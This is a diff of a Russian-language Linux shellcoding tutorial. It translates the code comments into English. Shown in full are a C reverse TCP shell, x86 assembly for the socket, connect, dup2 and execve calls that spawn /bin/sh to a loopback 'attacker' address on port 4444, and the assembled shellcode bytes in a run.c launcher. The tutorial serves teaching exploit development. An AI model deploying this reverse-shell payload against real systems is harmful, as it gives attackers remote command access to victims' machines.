@@ -12,17 +12,17 @@
 При тестировании shellcode удобно просто вставить его в программу и запустить. Мы будем использовать тот же код, что и в первом посте (`run.c`):           
 ```cpp
 /*
-run.c - небольшой каркас программы для выполнения shellcode
+run.c - a small skeleton program to run shellcode
 */
-// здесь будет байт-код
-char code[] = "мой shellcode";
+// bytecode here
+char code[] = "my shellcode here";
 
 int main(int argc, char **argv) {
-  int (*func)();             // указатель на функцию
-  func = (int (*)()) code;   // func указывает на наш shellcode
-  (int)(*func)();            // выполняем код в code[]
-  // если программа вернула 0 вместо 1,
-  // значит, shellcode сработал
+  int (*func)();             // function pointer
+  func = (int (*)()) code;   // func points to our shellcode
+  (int)(*func)();            // execute a function code[]
+  // if our program returned 0 instead of 1, 
+  // so our shellcode worked
   return 1;
 }
 ```
@@ -33,9 +33,9 @@ int main(int argc, char **argv) {
 Вот наш базовый код (`shell.c`):
 ```cpp
 /*
-shell.c - обратный TCP shell
+shell.c - reverse TCP shell
 author: @cocomelonc
-demo shell для примера shellcoding в Linux
+demo shell for linux shellcoding example
 */
 #include <stdio.h>
 #include <sys/socket.h>
@@ -45,29 +45,29 @@ demo shell для примера shellcoding в Linux
 
 int main () {
 
-  // IP-адрес атакующего
+  // attacker IP address
   const char* ip = "127.0.0.1";
 
-  // структура адреса
+  // address struct
   struct sockaddr_in addr;
   addr.sin_family = AF_INET;
   addr.sin_port = htons(4444);
   inet_aton(ip, &addr.sin_addr);
 
-  // системный вызов socket
+  // socket syscall
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-  // системный вызов connect
+  // connect syscall
   connect(sockfd, (struct sockadr *)&addr, sizeof(addr));
 
   for (int i = 0; i < 3; i++) {
-    // dup2(sockfd, 0) - stdin
+    // dup2(sockftd, 0) - stdin
     // dup2(sockfd, 1) - stdout
     // dup2(sockfd, 2) - stderr
     dup2(sockfd, i);
   }
 
-  // системный вызов execve
+  // execve syscall
   execve("/bin/sh", NULL, NULL);
 
   return 0;
@@ -92,7 +92,7 @@ int main () {
 ```nasm
 ; int socketcall(int call, unsigned long *args);
 push 0x66        ; sys_socketcall 102
-pop  eax         ; обнуляем eax
+pop  eax         ; zero out eax
 ```
 
 Следующий важный момент - различные функции вызова socketcall можно найти в файле `/usr/include/linux/net.h`:           
@@ -102,7 +102,7 @@ pop  eax         ; обнуляем eax
 Сначала необходимо использовать `SYS_SOCKET (0x1)`, затем очистить `ebx`:
 ```nasm
 push 0x1         ; sys_socket 0x1
-pop  ebx         ; обнуляем ebx
+pop  ebx         ; zero out ebx
 ```
 
 Вызов `socket()` принимает 3 аргумента и возвращает файловый дескриптор сокета:   
@@ -134,7 +134,7 @@ nvim /usr/include/bits/socket.h
 
 Основываясь на этой информации, можно загрузить различные аргументы (socket_family, socket_type, protocol) в стек после очистки регистра `edx`:       
 ```nasm
-xor  edx, edx    ; обнуляем edx
+xor  edx, edx    ; zero out edx
 
 ; int socket(int domain, int type, int protocol);
 push edx         ; protocol = IPPROTO_IP (0x0)
@@ -143,21 +143,17 @@ push 0x2         ; socket_family = AF_INET (0x2)
 ```
 
 Так как `ecx` должен содержать указатель на эту структуру, копируем `esp`:        
-```nasm
-mov  ecx, esp    ; перемещаем указатель стека в ecx
-```
+`mov  ecx, esp`    ; перемещаем указатель стека в ecx    
 
 И наконец выполняем системный вызов:           
-```nasm
-int  0x80        ; системный вызов (exec sys_socket)
-```
+
+`int  0x80`        ; системный вызов (exec sys_socket)     
 
 Этот вызов возвращает файловый дескриптор сокета в `eax`.          
 
 В итоге:
-```nasm
-xchg edx, eax    ; сохраняем результат (sockfd) для дальнейшего использования
-```
+
+`xchg edx, eax`    ; сохраняем результат (sockfd) для дальнейшего использования   
 
 ### подключение к указанному IP и порту       
 
@@ -170,16 +166,16 @@ mov  al, 0x66    ; socketcall 102
 Теперь рассмотрим аргументы функции `connect()`, и самый интересный аргумент - это структура `sockaddr`:
 ```cpp
 struct sockaddr_in {
-   __kernel_sa_family_t  sin_family;   /* Семейство адресов    */
-  __be16                 sin_port;     /* Номер порта          */
-  struct in_addr         sin_addr;     /* IP-адрес             */
+   __kernel_sa_family_t  sin_family;   /* Address family    */
+  __be16                 sin_port;     /* Port number       */
+  struct in_addr         sin_addr;     /* Internet address  */
 };
 ```
 
 Теперь нужно расположить аргументы в правильном порядке. Сначала `sin_addr`, затем `sin_port` и последним `sin_family` (помним: порядок обратный!):     
 ```nasm
 ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-push 0x0101017f  ; sin_addr = 127.1.1.1 (сетевой порядок байтов)
+push 0x0101017f  ; sin_addr = 127.1.1.1 (network byte order)
 push word 0x5c11 ; sin_port = 4444
 ```
 
@@ -194,18 +190,16 @@ push word bx     ; sin_family = AF_INET
 
 Затем сохраняем указатель стека на эту структуру sockaddr в `ecx`:
 
-```nasm
-mov  ecx, esp    ; перемещаем указатель стека в структуру sockaddr
-```
+`mov  ecx, esp`    ; перемещаем указатель стека в структуру sockaddr     
 
 Теперь:
 ```nasm
 push 0x10        ; addrlen = 16
 push ecx         ; const struct sockaddr *addr
 push edx         ; sockfd
-mov  ecx, esp    ; перемещаем указатель стека в ecx (структура sockaddr_in)
+mov  ecx, esp    ; move stack pointer to ecx (sockaddr_in struct)
 inc  ebx         ; sys_connect (0x3)
-int  0x80        ; системный вызов (exec sys_connect)
+int  0x80        ; syscall (exec sys_connect)
 ```
 
 ### перенаправление stdin, stdout и stderr через dup2
@@ -213,14 +207,14 @@ int  0x80        ; системный вызов (exec sys_connect)
 Теперь устанавливаем начальное значение счетчика и сбрасываем `ecx` для цикла:             
 
 ```nasm
-push 0x2         ; устанавливаем счетчик на 2
-pop  ecx         ; обнуляем ecx (сбрасываем для цикла newfd)
+push 0x2         ; set counter to 2
+pop  ecx         ; zero to ecx (reset for newfd loop)
 ```
 
 `ecx` теперь готов для цикла, просто сохраняем файловый дескриптор сокета в `ebx`, так как он потребуется при вызове системного вызова dup2:
 
 ```nasm
-xchg ebx, edx    ; сохраняем sockfd
+xchg ebx, edx    ; save sockfd
 ```
 
 Затем `dup2` принимает 2 аргумента:         
@@ -242,9 +236,9 @@ for (int i = 0; i < 3; i++) {
 ```nasm
 dup:
   mov  al, 0x3f    ; sys_dup2 = 63 = 0x3f
-  int  0x80        ; системный вызов (exec sys_dup2)
-  dec  ecx         ; уменьшаем счетчик
-  jns  dup         ; пока SF не установлен -> переход к dup
+  int  0x80        ; syscall (exec sys_dup2)
+  dec  ecx         ; decrement counter
+  jns  dup         ; as long as SF is not set -> jmp to dup
 ```
 
 `jns` просто выполняет переход к "dup", пока флаг знака (`SF`) не установлен.   
@@ -264,17 +258,17 @@ gdb -q ./rev
 
 Этот фрагмент кода аналогичен примеру из первой части, но с небольшим изменением:
 ```nasm
-; запуск /bin/sh с использованием execve
+; spawn /bin/sh using execve
 ; int execve(const char *filename, 
 ; char *const argv[],char *const envp[]);
-mov  al, 0x0b    ; системный вызов: sys_execve = 11 (mov eax, 11)
+mov  al, 0x0b    ; syscall: sys_execve = 11 (mov eax, 11)
 inc  ecx         ; argv=0
 mov  edx, ecx    ; envp=0
-push edx         ; завершающий NULL
+push edx         ; terminating NULL
 push 0x68732f2f   ; "hs//"
 push 0x6e69622f   ; "nib/"
-mov  ebx, esp    ; сохраняем указатель на имя файла
-int  0x80        ; системный вызов: exec sys_execve
+mov  ebx, esp    ; save pointer to filename
+int  0x80        ; syscall: exec sys_execve
 ```
 
 Как видите, нам нужно отдельно поместить завершающий `NULL` для строки `/bin//sh` в стек, так как его там нет.    
@@ -403,9 +397,9 @@ objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
 Затем заменяем код в `run.c` следующим:
 ```cpp
 /*
-run.c - небольшой каркас программы для выполнения shellcode
+run.c - a small skeleton program to run shellcode
 */
-// вставляем наш байт-код
+// bytecode here
 char code[] = 
 "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89"
 "\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68"
@@ -415,11 +409,11 @@ char code[] =
 "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
 
 int main(int argc, char **argv) {
-  int (*func)();             // указатель на функцию
-  func = (int (*)()) code;   // func указывает на наш shellcode
-  (int)(*func)();            // выполняем код в code[]
-  // если программа вернула 0 вместо 1,
-  // значит, shellcode сработал
+  int (*func)();             // function pointer
+  func = (int (*)()) code;   // func points to our shellcode
+  (int)(*func)();            // execute a function code[]
+  // if our program returned 0 instead of 1,
+  // so our shellcode worked
   return 1;
 }
 ```
